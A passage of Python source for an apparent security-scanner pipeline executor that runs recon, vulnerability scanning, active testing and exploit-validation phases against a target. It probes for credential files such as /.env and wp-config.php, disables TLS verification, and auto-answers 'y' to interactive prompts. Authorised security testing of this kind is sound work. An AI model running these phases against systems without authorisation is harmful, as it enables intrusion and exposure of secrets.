"""
pipeline/executor.py — Unified canonical pipeline executor.

Runs the 10-phase canonical pipeline identically in Docker and CLI.
Both modes call this executor — the only difference is whether commands
run via subprocess (CLI) or via direct Python imports (Docker in-process).

Architecture:
  CanonicalExecutor.run(target, output_dir, mode="inline"|"subprocess")
    → iterates CANONICAL_PHASES
    → for each phase: calls _run_phase()
      → "inline":     imports module and calls its API directly
      → "subprocess": calls python oneinfinity.py <command> <args>
    → collects PhaseResult per phase
    → merges all findings → deduplicates → normalizes source_type
    → writes unified_findings.json + pipeline_report.json
"""

from __future__ import annotations

import json
import logging
import os
import subprocess
import shutil
import sys
import time
import uuid
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

from .canonical import (
    CANONICAL_PHASES, PHASE_MAP, MANDATORY_PHASES, WAF_SKIP_PHASES,
    PhaseConfig, CanonicalPhase, phase_cli_args,
)

log = logging.getLogger("oi.pipeline.executor")

ROOT = Path(__file__).parent.parent.parent.parent  # project root (src/oneinfinity/pipeline/ → up 4)
CLI_SCRIPT = str(ROOT / "run.py")


@dataclass
class PhaseResult:
    name: str
    status: str = "pending"         # pending | running | completed | failed | skipped
    started_at: float = 0.0
    ended_at: float = 0.0
    findings: List[dict] = field(default_factory=list)
    finding_count: int = 0
    error: str = ""
    cli_exit_code: int = 0
    meta: Dict[str, Any] = field(default_factory=dict)

    @property
    def elapsed_s(self) -> float:
        if self.started_at and self.ended_at:
            return round(self.ended_at - self.started_at, 2)
        return 0.0

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "status": self.status,
            "elapsed_s": self.elapsed_s,
            "finding_count": self.finding_count,
            "error": self.error,
            "meta": self.meta,
        }


@dataclass
class PipelineResult:
    run_id: str
    target: str
    mode: str                            # "inline" | "subprocess"
    output_dir: str
    started_at: float = 0.0
    ended_at: float = 0.0
    status: str = "pending"              # pending | running | completed | failed
    phases: Dict[str, PhaseResult] = field(default_factory=dict)
    findings: List[dict] = field(default_factory=list)
    waf_detected: bool = False
    waf_name: str = ""
    waf_passive_mode: bool = False
    phases_skipped: List[str] = field(default_factory=list)
    phases_failed: List[str] = field(default_factory=list)
    error: str = ""

    @property
    def elapsed_s(self) -> float:
        if self.started_at and self.ended_at:
            return round(self.ended_at - self.started_at, 2)
        return 0.0

    def to_dict(self) -> dict:
        return {
            "run_id": self.run_id,
            "target": self.target,
            "mode": self.mode,
            "output_dir": self.output_dir,
            "status": self.status,
            "elapsed_s": self.elapsed_s,
            "waf": {"detected": self.waf_detected, "name": self.waf_name, "passive": self.waf_passive_mode},
            "phases": {k: v.to_dict() for k, v in self.phases.items()},
            "finding_count": len(self.findings),
            "phases_skipped": self.phases_skipped,
            "phases_failed": self.phases_failed,
            "error": self.error,
        }


# ---------------------------------------------------------------------------
# Deduplication
# ---------------------------------------------------------------------------

def _fingerprint(finding: dict) -> str:
    """Stable fingerprint for deduplication."""
    url = finding.get("url", finding.get("endpoint", ""))
    vtype = finding.get("vuln_type", finding.get("title", ""))
    param = finding.get("parameter", "")
    return f"{vtype}|{url}|{param}".lower().strip()


def deduplicate(findings: List[dict]) -> List[dict]:
    """Remove duplicate findings keeping the highest-confidence version."""
    seen: Dict[str, dict] = {}
    for f in findings:
        fp = _fingerprint(f)
        if fp not in seen:
            seen[fp] = f
        else:
            # Keep higher confidence
            existing_conf = float(seen[fp].get("confidence", 0) or 0)
            new_conf = float(f.get("confidence", 0) or 0)
            if new_conf > existing_conf:
                seen[fp] = f
    return list(seen.values())


def normalize_finding(f: dict, source_type: str = "tool") -> dict:
    """Ensure a finding has all required fields with correct types."""
    out = dict(f)
    out.setdefault("source_type", source_type)
    out.setdefault("vuln_type", out.pop("title", out.pop("type", out.get("attack_type", "unknown"))))
    out.setdefault("severity", "info")
    out.setdefault("url", out.get("endpoint", out.get("target", "")))
    out.setdefault("endpoint", out["url"])
    out.setdefault("confidence", 0.5)
    out.setdefault("validation_status", "unverified")
    out.setdefault("finding_id", f"F-{uuid.uuid4().hex[:8].upper()}")
    # Normalize severity
    sev = str(out["severity"]).lower().strip()
    if sev in ("critical", "high", "medium", "low", "info"):
        out["severity"] = sev
    else:
        out["severity"] = "info"
    # Normalize confidence
    try:
        out["confidence"] = max(0.0, min(1.0, float(out["confidence"])))
    except (TypeError, ValueError):
        out["confidence"] = 0.5
    return out


# ---------------------------------------------------------------------------
# Canonical Executor
# ---------------------------------------------------------------------------

class CanonicalExecutor:
    """
    Runs the 10-phase canonical pipeline.

    Parameters
    ----------
    mode : "inline" | "subprocess"
        "inline"     — imports modules directly (used inside Docker worker)
        "subprocess" — calls python oneinfinity.py <cmd> (used by CLI)
    waf_profile : dict | None
        Pre-detected WAF profile from waf_detection_engine.as_scan_config()
    on_progress : callable | None
        Callback(phase_name, pct, message)
    prior_results_dir : str | None
        Directory containing output files from a prior scan.
        Phase output files that don't yet exist in output_dir will be seeded
        from here so that downstream phases have the context they need.
        Example: prior adaptive_recon.json seeds vuln_scan; prior findings.json
        seeds exploit_validation and exploit_chains.
    """

    def __init__(
        self,
        mode: str = "subprocess",
        waf_profile: Optional[dict] = None,
        on_progress: Optional[Callable[[str, int, str], None]] = None,
        timeout_multiplier: float = 1.0,
        skip_phases: Optional[List[str]] = None,
        prior_results_dir: Optional[str] = None,
        auth_config: Optional[Dict[str, str]] = None,
    ):
        if mode not in ("inline", "subprocess"):
            raise ValueError(f"mode must be 'inline' or 'subprocess', got: {mode!r}")
        self.mode = mode
        self._last_emitted_pct: int = 0
        self.waf_profile = waf_profile or {}
        self.on_progress = on_progress
        self.timeout_multiplier = timeout_multiplier
        self.skip_phases = set(skip_phases or [])
        self.prior_results_dir = prior_results_dir
        # auth_config: optional dict with keys: session_cookie, bearer_token, auth_header
        # Used by all inline phases to make authenticated requests
        self.auth_config: Dict[str, str] = auth_config or {}

    def _build_auth_headers(self) -> Dict[str, str]:
        """Build HTTP headers from auth_config for authenticated scanning."""
        headers: Dict[str, str] = {}
        if not self.auth_config:
            return headers
        if self.auth_config.get("bearer_token"):
            headers["Authorization"] = f"Bearer {self.auth_config['bearer_token']}"
        elif self.auth_config.get("auth_header"):
            # Raw header value like "Bearer xyz" or "Token abc"
            headers["Authorization"] = self.auth_config["auth_header"]
        if self.auth_config.get("session_cookie"):
            headers["Cookie"] = self.auth_config["session_cookie"]
        return headers

    def run(self, target: str, output_dir: str) -> PipelineResult:
        """Execute all 10 canonical phases against target."""
        run_id = uuid.uuid4().hex[:12].upper()
        out_path = Path(output_dir)
        out_path.mkdir(parents=True, exist_ok=True)

        # Seed output dir with prior phase outputs so downstream phases
        # (vuln_scan, exploit_chains, etc.) have the context they need.
        # Only copies files that don't already exist in out_path.
        if self.prior_results_dir:
            self._seed_from_prior(out_path, Path(self.prior_results_dir))

        result = PipelineResult(
            run_id=run_id,
            target=target,
            mode=self.mode,
            output_dir=output_dir,
            started_at=time.time(),
            status="running",
            phases={p.name: PhaseResult(name=p.name) for p in CANONICAL_PHASES},
        )

        # WAF state
        waf_passive = self.waf_profile.get("passive_only", False)
        result.waf_detected = self.waf_profile.get("waf_detected", False)
        result.waf_name = self.waf_profile.get("waf_name", "")
        result.waf_passive_mode = waf_passive

        log.info("[pipeline][%s] Starting canonical run for %s (mode=%s waf=%s)",
                 run_id, target, self.mode, result.waf_name or "none")

        all_findings: List[dict] = []

        try:
            for phase_cfg in CANONICAL_PHASES:
                pname = phase_cfg.name
                pr = result.phases[pname]

                # Skip check
                if pname in self.skip_phases:
                    if phase_cfg.mandatory:
                        pr.status = "failed"
                        pr.error = "mandatory phase explicitly skipped"
                        pr.meta["reason"] = "explicitly skipped (mandatory)"
                        result.phases_failed.append(pname)
                        self._emit(pname, phase_cfg.pct_complete, f"FAILED: {pname} — mandatory phase skipped")
                    else:
                        pr.status = "skipped"
                        pr.meta["reason"] = "explicitly skipped"
                        result.phases_skipped.append(pname)
                        self._emit(pname, phase_cfg.pct_complete, f"Skipped (explicit): {pname}")
                    continue

                if waf_passive and phase_cfg.skip_on_waf_passive:
                    pr.status = "skipped"
                    pr.meta["reason"] = "WAF passive mode — active testing disabled"
                    result.phases_skipped.append(pname)
                    self._emit(pname, phase_cfg.pct_complete, f"Skipped (WAF passive): {pname}")
                    log.info("[pipeline] Phase %s skipped: WAF passive mode", pname)
                    continue

                pr.status = "running"
                pr.started_at = time.time()
                self._emit(pname, max(phase_cfg.pct_complete - 5, 0), f"Starting: {phase_cfg.display_name}")

                try:
                    # OPTIMIZATION: If output file already exists (seeded or prior run), read it and skip execution
                    fpath = out_path / phase_cfg.output_file
                    if fpath.exists() and fpath.stat().st_size > 0:
                        log.info("[pipeline] Phase %s output file exists — skipping execution and reading findings", pname)
                        self._emit(pname, phase_cfg.pct_complete, f"Skipped: {phase_cfg.display_name} (using existing output)")
                        findings = self._read_output_file(phase_cfg, out_path)
                    else:
                        findings = self._run_phase(phase_cfg, target, output_dir, result)

                    # Normalize findings from this phase
                    normalized = [
                        normalize_finding(f, source_type=phase_cfg.source_type)
                        for f in findings
                    ]
                    all_findings.extend(normalized)
                    pr.findings = normalized
                    pr.finding_count = len(normalized)
                    pr.status = "completed"
                    pr.ended_at = time.time()
                    self._emit(pname, phase_cfg.pct_complete,
                               f"Completed: {phase_cfg.display_name} ({pr.finding_count} findings, {pr.elapsed_s}s)")
                    log.info("[pipeline][%s] Phase %s done: %d findings in %.1fs",
                             run_id, pname, pr.finding_count, pr.elapsed_s)

                except Exception as exc:
                    pr.status = "failed"
                    pr.ended_at = time.time()
                    pr.error = str(exc)
                    result.phases_failed.append(pname)
                    log.error("[pipeline][%s] Phase %s FAILED: %s", run_id, pname, exc)
                    self._emit(pname, phase_cfg.pct_complete, f"FAILED: {pname} — {exc}")

                    if phase_cfg.mandatory:
                        log.warning("[pipeline] Mandatory phase %s failed — continuing anyway to maximize output", pname)
                        # Continue rather than abort — collect whatever we can
        finally:
            self._cleanup_temp_files(out_path)

        # Deduplicate and finalize
        result.findings = deduplicate(all_findings)
        result.ended_at = time.time()
        result.status = "completed"
        if result.phases_failed:
            failed_mandatory = [p for p in result.phases_failed if p in MANDATORY_PHASES]
            if failed_mandatory:
                result.status = "partial"

        self._write_outputs(result, out_path)
        log.info("[pipeline][%s] Finished: %d unique findings, status=%s, elapsed=%.1fs",
                 run_id, len(result.findings), result.status, result.elapsed_s)
        return result

    def _cleanup_temp_files(self, out_path: Path) -> None:
        """Remove intermediate garbage and .tmp files from output directory."""
        log.debug("[pipeline] Cleaning up temporary files in %s", out_path)
        try:
            # Remove nuclei temporary artifacts
            for tmp in out_path.glob("*.tmp"):
                try:
                    tmp.unlink()
                except Exception:
                    pass
            # Remove zero-byte files that sometimes appear during crash
            for f in out_path.glob("*"):
                if f.is_file() and f.stat().st_size == 0:
                    try:
                        f.unlink()
                    except Exception:
                        pass
        except Exception as exc:
            log.warning("[pipeline] Cleanup failed: %s", exc)

    # ------------------------------------------------------------------ #
    #  Phase dispatch
    # ------------------------------------------------------------------ #

    def _run_phase(
        self,
        phase: PhaseConfig,
        target: str,
        output_dir: str,
        result: PipelineResult,
    ) -> List[dict]:
        """Route phase to inline or subprocess handler."""
        if self.mode == "inline":
            return self._run_phase_inline(phase, target, output_dir, result)
        else:
            return self._run_phase_subprocess(phase, target, output_dir, result)

    def _run_phase_inline(
        self,
        phase: PhaseConfig,
        target: str,
        output_dir: str,
        result: PipelineResult,
    ) -> List[dict]:
        """
        Run phase by importing and calling the relevant engine directly.
        Used inside Docker worker — no subprocess overhead.
        """
        pname = phase.name
        out_path = Path(output_dir)
        waf = self.waf_profile

        if pname == "target_registration":
            return self._inline_target_registration(target, out_path)

        elif pname == "deep_recon":
            return self._inline_deep_recon(target, out_path, waf)

        elif pname == "vuln_scan":
            return self._inline_vuln_scan(target, out_path, waf)

        elif pname == "active_testing":
            return self._inline_active_testing(target, out_path, waf)

        elif pname == "auth_session":
            return self._inline_auth_session(target, out_path, waf)

        elif pname == "business_logic":
            return self._inline_business_logic(target, out_path, waf)

        elif pname == "exploit_validation":
            return self._inline_exploit_validation(target, out_path)

        elif pname == "exploit_chains":
            return self._inline_exploit_chains(target, out_path)

        elif pname == "attack_graph":
            return self._inline_attack_graph(target, out_path)

        elif pname == "ai_theory":
            return self._inline_ai_theory(target, out_path)

        elif pname == "graphql_scan":
            return self._inline_graphql_scan(target, out_path)

        elif pname == "browser_analysis":
            return self._inline_browser_analysis(target, out_path)

        elif pname == "smuggling_test":
            return self._inline_smuggling_test(target, out_path)

        elif pname == "oob_check":
            return self._inline_oob_check(target, out_path)

        elif pname == "advanced_scan":
            return self._inline_advanced_scan(target, out_path, waf)

        elif pname == "cicd_scan":
            return self._inline_cicd_scan(target, out_path)

        elif pname == "container_scan":
            return self._inline_container_scan(target, out_path)

        elif pname == "grpc_scan":
            return self._inline_grpc_scan(target, out_path)

        else:
            raise ValueError(f"Unknown phase: {pname!r}")

    def _run_phase_subprocess(
        self,
        phase: PhaseConfig,
        target: str,
        output_dir: str,
        result: PipelineResult,
    ) -> List[dict]:
        """
        Run phase by executing oneinfinity.py as a subprocess.
        Used by CLI mode — identical CLI args as Docker exec.
        Internal phases (_internal_*) run inline even in subprocess mode
        because they have no CLI equivalent (and god mode threads are non-daemon,
        so interpreter-shutdown issues don't apply).
        """
        # Internal phases always run inline (no CLI equivalent)
        if phase.cli_command.startswith("_internal_"):
            return self._run_phase_inline(phase, target, output_dir, result)

        # Build args — same as canonical.phase_cli_args()
        # Commands fall into three categories for --output:
        #   _no_output_flag   — no --output flag at all
        #   _file_output_cmds — write a single JSON file; pass full file path
        #   everything else   — resolve_output_dir(path, target); pass directory
        _file_output_cmds = {
            "swarm-scan", "simulate-attacks", "zero-day",
            "graphql-scan", "browser-scan", "smuggling-scan",
        }
        _no_output_flag   = {"_internal_register", "_internal_validate", "_internal_oob_check", "_internal_advanced_scan"}
        cmd_args = [phase.cli_command, target] + phase.cli_extra_args
        if phase.cli_command in _no_output_flag:
            pass  # No --output flag
        elif phase.cli_command in _file_output_cmds:
            # Pass the full file path so the command writes directly to it
            cmd_args += ["--output", str(Path(output_dir) / phase.output_file)]
        else:
            # Directory-based commands (adaptive-recon, vuln-scan, chains, attack-graph)
            cmd_args += ["--output", output_dir]

        full_cmd = [sys.executable, CLI_SCRIPT] + cmd_args

        # Apply WAF rate limiting via environment
        env = os.environ.copy()
        env["ONEINFINITY_HOME"] = str(Path(output_dir).parent)
        if self.waf_profile.get("waf_detected"):
            env["OI_WAF_RPS"] = str(self.waf_profile.get("rate_limit_rps", 5))
            env["OI_WAF_JITTER"] = str(self.waf_profile.get("jitter_ms", 500))
        # Auto-yes for interactive commands
        env["OI_AUTO_YES"] = "1"

        timeout = int(phase.timeout_s * self.timeout_multiplier)
        log.info("[subprocess] %s", " ".join(str(a) for a in full_cmd))

        try:
            proc = subprocess.run(
                full_cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                env=env,
                cwd=str(ROOT),
                input="y\n",   # Feed 'y' to any interactive prompts
            )
            result.phases[phase.name].cli_exit_code = proc.returncode
            if proc.returncode != 0:
                log.warning("[subprocess] Exit %d for phase %s: %s",
                            proc.returncode, phase.name, proc.stderr[-300:])
        except subprocess.TimeoutExpired as _te:
            try:
                proc.kill()
                proc.communicate(timeout=5)
            except Exception:
                pass
            # Salvage any partial output written before the timeout
            fpath = Path(output_dir) / phase.output_file
            if fpath.exists() and fpath.stat().st_size > 0:
                log.warning("[subprocess] Phase %s timed out after %ds — reading partial output",
                            phase.name, timeout)
                try:
                    return self._read_output_file(phase, Path(output_dir))
                except Exception:
                    pass
            raise RuntimeError(f"Phase {phase.name} timed out after {timeout}s")

        # Read canonical output file to extract findings
        return self._read_output_file(phase, Path(output_dir))

    # ------------------------------------------------------------------ #
    #  Inline phase implementations
    # ------------------------------------------------------------------ #

    def _inline_target_registration(self, target: str, out: Path) -> List[dict]:
        import uuid as _uuid
        from urllib.parse import urlparse
        parsed = urlparse(target if "://" in target else f"https://{target}")
        registration = {
            "target": target,
            "normalized_url": parsed.geturl(),
            "scheme": parsed.scheme or "https",
            "host": parsed.netloc or target,
            "registered_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "session_id": _uuid.uuid4().hex,
        }
        (out / "target_registration.json").write_text(json.dumps(registration, indent=2))
        return []  # Registration produces no findings

    def _inline_deep_recon(self, target: str, out: Path, waf: dict) -> List[dict]:
        try:
            from oneinfinity.recon.adaptive_recon_engine import AdaptiveReconEngine
            engine = AdaptiveReconEngine(
                target=target,
                output_dir=str(out),
                depth="deep",
            )
            intel = engine.run()
            # Save to canonical output file
            data = {
                "subdomains": getattr(intel, "subdomains", []),
                "urls": list(getattr(intel, "all_urls", []) or [])[:2000],
                "technologies": list(getattr(intel, "technologies", []) or []),
            }
            (out / "adaptive_recon.json").write_text(json.dumps(data, indent=2, default=str))
        except Exception as exc:
            log.error("deep_recon inline failed: %s", exc)
            raise

        # ── OWASP gap checks: TLS/cert + backup files ─────────────────────
        gap_findings = []
        try:
            from oneinfinity.modules.owasp_gap_checks import (
                check_weak_tls, check_tls_cert, check_backup_files,
                gap_check_result_to_finding,
            )
            from urllib.parse import urlparse as _up2
            _parsed = _up2(target if "://" in target else f"https://{target}")
            _host = _parsed.hostname or target
            _port = _parsed.port or 443

            for _check_fn, _kwargs in [
                (check_weak_tls, {"host": _host, "port": _port}),
                (check_tls_cert, {"host": _host, "port": _port}),
            ]:
                try:
                    _r = _check_fn(**_kwargs)
                    _f = gap_check_result_to_finding(_r, url=f"https://{_host}:{_port}")
                    if _f:
                        gap_findings.append(normalize_finding(_f, source_type="owasp_gap"))
                except Exception as _e:
                    log.debug("deep_recon gap check %s failed: %s", _check_fn.__name__, _e)

            _known_paths = ["/index.php", "/config.php", "/wp-config.php",
                            "/application.properties", "/.env", "/settings.py"]
            try:
                _recon_path = out / "adaptive_recon.json"
                if _recon_path.exists():
                    _rd = json.loads(_recon_path.read_text())
                    for _u in _rd.get("urls", [])[:30]:
                        from urllib.parse import urlparse as _up3
                        _p = _up3(_u).path
                        if _p and _p not in _known_paths:
                            _known_paths.append(_p)
            except Exception:
                pass

            _base = f"{_parsed.scheme}://{_parsed.netloc}" if _parsed.netloc else f"https://{_host}"
            for _r in check_backup_files(_base, _known_paths[:20]):
                try:
                    _f = gap_check_result_to_finding(_r, url=_base)
                    if _f:
                        gap_findings.append(normalize_finding(_f, source_type="owasp_gap"))
                except Exception as _e:
                    log.debug("backup_files result processing failed: %s", _e)
        except Exception as _exc:
            log.warning("deep_recon OWASP gap checks failed: %s", _exc)

        # ── P1.3: DNS Security Scanner ────────────────────────────────────────
        # async bridge — DNSSecurityScanner.scan() is async, executor is sync
        # Passes extracted hostname (not full URL) and optional subdomains from recon
        try:
            import asyncio as _asyncio_dns
            from urllib.parse import urlparse as _up_dns
            _dns_host = (_up_dns(target if "://" in target else f"https://{target}")).hostname or target
            # Forward subdomains from recon output if available
            _dns_subdomains = None
            _dns_recon_file = out / "adaptive_recon.json"
            if _dns_recon_file.exists():
                try:
                    _dns_rd = json.loads(_dns_recon_file.read_text())
                    _dns_subdomains = _dns_rd.get("subdomains", None) or None
                except Exception:
                    pass
            from oneinfinity.scan.dns_security_scanner import DNSSecurityScanner
            _dns_scanner = DNSSecurityScanner(timeout=6.0)
            _dns_findings = _asyncio_dns.run(
                _dns_scanner.scan(_dns_host, subdomains=_dns_subdomains)
            )
            # DNSSecurityScanner returns list[dict] directly — no .to_dict() needed
            for _df in (_dns_findings or []):
                if isinstance(_df, dict):
                    _df.setdefault("source_type", "tool")
                    _df.setdefault("confidence", 0.80)
                    gap_findings.append(_df)
            if _dns_findings:
                log.info("deep_recon DNSSecurityScanner: %d findings for %s", len(_dns_findings), _dns_host)
        except ImportError:
            log.debug("deep_recon DNSSecurityScanner not available")
        except Exception as _dns_exc:
            log.debug("deep_recon DNSSecurityScanner failed (non-fatal): %s", _dns_exc)

        # ── Go Sidecars: lateral portscan + service CVE mapping ───────────────
        try:
            import asyncio as _asyncio_go
            from urllib.parse import urlparse as _up_go
            _go_host = (_up_go(target if "://" in target else f"https://{target}")).hostname or target
            from oneinfinity.scan.go_lateral_portscan_bridge import GoLateralPortscanBridge
            _lat = GoLateralPortscanBridge()
            if _lat.is_available():
                _lat_findings = _asyncio_go.run(_lat.scan(targets=[_go_host], timeout=60.0))
                for _lf in (_lat_findings or []):
                    if isinstance(_lf, dict):
                        _lf.setdefault("source_type", "tool")
                        _lf.setdefault("source_tool", "go_lateral_portscan")
                        gap_findings.append(_lf)
                if _lat_findings:
                    log.info("deep_recon GoLateralPortscan: %d port findings for %s", len(_lat_findings), _go_host)
        except (ImportError, Exception) as _lat_exc:
            log.debug("deep_recon GoLateralPortscanBridge skipped (non-fatal): %s", _lat_exc)

        # GoServiceCVEBridge — map discovered services to CVEs
        try:
            import asyncio as _asyncio_cve
            _recon_data_file = out / "adaptive_recon.json"
            _services = []
            if _recon_data_file.exists():
                try:
                    _rd_cve = json.loads(_recon_data_file.read_text())
                    _services = _rd_cve.get("services", [])
                except Exception:
                    pass
            if _services:
                from oneinfinity.scan.go_service_cve_bridge import GoServiceCVEBridge
                _cve = GoServiceCVEBridge()
                if _cve.is_available():
                    _cve_findings = _asyncio_cve.run(_cve.map_services(_services, timeout=30.0))
                    for _cf in (_cve_findings or []):
                        if isinstance(_cf, dict):
                            _cf.setdefault("source_type", "tool")
                            _cf.setdefault("source_tool", "go_service_cve")
                            gap_findings.append(_cf)
                    if _cve_findings:
                        log.info("deep_recon GoServiceCVE: %d CVE findings", len(_cve_findings))
        except (ImportError, Exception) as _cve_exc:
            log.debug("deep_recon GoServiceCVEBridge skipped (non-fatal): %s", _cve_exc)

        if gap_findings:
            log.info("deep_recon OWASP gap: %d findings", len(gap_findings))
            try:
                _recon_out = out / "adaptive_recon.json"
                _d = json.loads(_recon_out.read_text()) if _recon_out.exists() else {}
                _d["gap_findings"] = _d.get("gap_findings", []) + gap_findings
                _recon_out.write_text(json.dumps(_d, indent=2, default=str))
            except Exception:
                pass

        return gap_findings

    def _inline_vuln_scan(self, target: str, out: Path, waf: dict) -> List[dict]:
        # Seed-first: load existing findings.json if present (prior scan context).
        # This ensures Docker inline mode has findings from prior nuclei/tool runs.
        seeded: List[dict] = []
        findings_file = out / "findings.json"
        if findings_file.exists():
            try:
                raw = json.loads(findings_file.read_text())
                if isinstance(raw, list):
                    seeded = raw
                elif isinstance(raw, dict):
                    seeded = raw.get("findings", raw.get("results", []))
            except Exception:
                pass
        # ── OWASP gap checks: crypto + client-side passive ─────────────────
        _gap_vuln = []
        try:
            from oneinfinity.modules.owasp_gap_checks import (
                check_weak_encryption_patterns, check_padding_oracle,
                check_service_worker, check_webrtc_leak, check_grpc_soap,
                gap_check_result_to_finding,
            )
            import urllib.request as _ur4, ssl as _ssl4
            _ctx4 = _ssl4.create_default_context()
            _ctx4.check_hostname = False
            _ctx4.verify_mode = _ssl4.CERT_NONE
            _probe4 = target if target.startswith("http") else f"https://{target}"

            _pages = [_probe4, _probe4 + "/app.js", _probe4 + "/static/js/main.chunk.js"]
            _recon4 = out / "adaptive_recon.json"
            if _recon4.exists():
                try:
                    _rd4 = json.loads(_recon4.read_text())
                    _pages += [_u for _u in _rd4.get("urls", []) if _u.endswith(".js")][:3]
                except Exception:
                    pass

            for _page_url in _pages[:6]:
                try:
                    _req4 = _ur4.Request(_page_url)
                    _req4.add_header("User-Agent", "Mozilla/5.0")
                    with _ur4.urlopen(_req4, timeout=8, context=_ctx4) as _r4:
                        _body4 = _r4.read(131072).decode("utf-8", errors="replace")
                        _hdrs4 = dict(_r4.headers)
                        for _check_fn, _kwargs in [
                            (check_weak_encryption_patterns, {"url": _page_url, "body": _body4}),
                            (check_service_worker, {"url": _page_url, "js_body": _body4}),
                            (check_webrtc_leak, {"url": _page_url, "js_body": _body4}),
                            (check_grpc_soap, {"base_url": _page_url,
                                               "response_headers": _hdrs4, "response_body": _body4}),
                        ]:
                            try:
                                _r = _check_fn(**_kwargs)
                                _f = gap_check_result_to_finding(_r, url=_page_url)
                                if _f:
                                    _gap_vuln.append(normalize_finding(_f, source_type="owasp_gap"))
                            except Exception as _e:
                                log.debug("vuln_scan gap %s failed: %s", _check_fn.__name__, _e)
                except Exception:
                    pass

            try:
                _req4 = _ur4.Request(_probe4)
                _req4.add_header("User-Agent", "Mozilla/5.0")
                with _ur4.urlopen(_req4, timeout=8, context=_ctx4) as _r4:
                    _sc4 = dict(_r4.headers).get("Set-Cookie", "")
                    if "=" in _sc4:
                        _cname = _sc4.split("=")[0].strip()
                        _cval = _sc4.split("=")[1].split(";")[0].strip()
                        _r = check_padding_oracle(_probe4, _cname, _cval)
                        _f = gap_check_result_to_finding(_r, url=_probe4)
                        if _f:
                            _gap_vuln.append(normalize_finding(_f, source_type="owasp_gap"))
            except Exception as _e:
                log.debug("padding_oracle check failed: %s", _e)

        except Exception as _exc:
            log.warning("vuln_scan OWASP gap checks failed: %s", _exc)

        if _gap_vuln:
            log.info("vuln_scan OWASP gap: %d findings", len(_gap_vuln))
            seeded = _gap_vuln + seeded

        # ── P2.1: Supply Chain Attack Engine — always runs regardless of seeded/pipeline path ──
        # Scans for dependency confusion, typosquatting, lockfile poisoning, and unpinned
        # GitHub Actions. Results are merged into every return path below.
        _sc_vuln_findings: List[dict] = []
        try:
            import asyncio as _asyncio_sc
            from oneinfinity.scan.supply_chain_attack_engine import SupplyChainAttackEngine
            _sc_probe = target if target.startswith("http") else f"https://{target}"

            async def _run_sc_scan():
                _sc_eng = SupplyChainAttackEngine()
                try:
                    return await _sc_eng.scan(_sc_probe)
                finally:
                    await _sc_eng.close()

            _sc_raw = _asyncio_sc.run(_run_sc_scan())
            for _sf in (_sc_raw or []):
                if isinstance(_sf, dict):
                    _sf.setdefault("source_type", "supply_chain")
                    _sf.setdefault("confidence", 0.80)
                    _sc_vuln_findings.append(_sf)
            if _sc_vuln_findings:
                log.info("vuln_scan supply_chain: %d findings", len(_sc_vuln_findings))
                for _sf in _sc_vuln_findings:
                    try:
                        from oneinfinity.core.db_manager import get_db_manager_sync
                        get_db_manager_sync().sync_save_finding(_sf)
                    except Exception:
                        pass
        except Exception as _sc_exc:
            log.warning("vuln_scan supply_chain_attack_engine failed (non-fatal): %s", _sc_exc)

        if seeded:
            log.info("vuln_scan inline: loaded %d seeded findings from %s", len(seeded), findings_file)
            return seeded + _sc_vuln_findings

        # No seeded findings — run Pipeline inline
        try:
            from oneinfinity.modules.pipeline import Pipeline
            rate = int(waf.get("nuclei_rate_limit", 300) if waf.get("waf_detected") else 300)
            p = Pipeline(
                target=target,
                output_dir=str(out),
                rate_limit=rate,
                nuclei_severity="info,low,medium,high,critical",
            )
            # Load prior recon data if available (adaptive_recon.json or legacy urls.json)
            for src_key, fname in [("urls", "adaptive_recon.json"), ("urls", "urls.json")]:
                fp = out / fname
                if fp.exists():
                    try:
                        data = json.loads(fp.read_text())
                        if isinstance(data, list):
                            setattr(p.result, src_key, data)
                        elif isinstance(data, dict):
                            val = data.get(src_key, data.get("urls", []))
                            if val:
                                setattr(p.result, src_key, val)
                                break
                    except Exception:
                        pass
            result = p.run(phases=["vuln"])
            _vuln_findings = list(result.findings) if result.findings else []

            # ── Re-scan with custom templates generated in exploit_validation ──
            # Picks up ~/.oneinfinity/custom_templates/ when the index file exists.
            try:
                _tpl_index_f = out / "custom_nuclei_templates.json"
                if not _tpl_index_f.exists():
                    # Fall back to the well-known directory directly
                    _tpl_index_f = None
                _custom_dir = str(Path.home() / ".oneinfinity" / "custom_templates")
                _tpl_dir_path = Path(_custom_dir)
                if _tpl_dir_path.exists() and any(_tpl_dir_path.rglob("*.yaml")):
                    from oneinfinity.modules.tool_wrappers import run_nuclei
                    _probe = target if target.startswith("http") else f"https://{target}"
                    _custom_result = run_nuclei(
                        _probe,
                        templates=_custom_dir,
                        severity="low,medium,high,critical",
                        timeout=180,
                    )
                    for _cf2 in (_custom_result.data or {}).get("findings", []):
                        _cf2.setdefault("source_type", "custom_nuclei_template")
                        _cf2.setdefault("validation_status", "confirmed")
                        _vuln_findings.append(_cf2)
                    if (_custom_result.data or {}).get("findings"):
                        log.info(
                            "vuln_scan custom templates: %d findings from %s",
                            len(_custom_result.data["findings"]), _custom_dir,
                        )
            except Exception as _ct_exc:
                log.debug("vuln_scan custom template re-scan failed (non-fatal): %s", _ct_exc)

            return _vuln_findings + _sc_vuln_findings
        except Exception as exc:
            log.error("vuln_scan inline failed: %s", exc)
            return _sc_vuln_findings

    def _inline_active_testing(self, target: str, out: Path, waf: dict) -> List[dict]:
        findings = []
        auth_headers = self._build_auth_headers()
        probe_target = target if target.startswith("http") else f"https://{target}"

        # ── Original validation engine ─────────────────────────────────────
        try:
            from oneinfinity.findings.validation_engine_web import WebValidationEngine
            existing = self._load_findings_from_dir(out)
            engine = WebValidationEngine()
            waf_detected = waf.get("waf_detected", False)
            results = engine.validate_all(existing, waf_detected=waf_detected)
            for r in results:
                if r.status == "confirmed":
                    f = dict(r.finding)
                    f["validation_status"] = "confirmed"
                    f["confidence"] = min(1.0, float(f.get("confidence", 0.5)) + r.confidence_delta)
                    findings.append(f)
        except Exception as exc:
            log.warning("active_testing validation engine: %s", exc)

        # ── Extended OWASP gap coverage ────────────────────────────────────
        from oneinfinity.modules.tool_wrappers import (
            run_file_upload_test, run_oauth_test, run_prototype_pollution_test,
            run_mfa_bypass_test, run_rate_limit_test, run_deserialization_test,
            run_websocket_test, run_pii_scanner, run_clickjacking_test,
        )

        # Load discovered URLs for PII scanning
        discovered_urls: List[str] = []
        recon_file = out / "adaptive_recon.json"
        if recon_file.exists():
            try:
                recon_data = json.loads(recon_file.read_text())
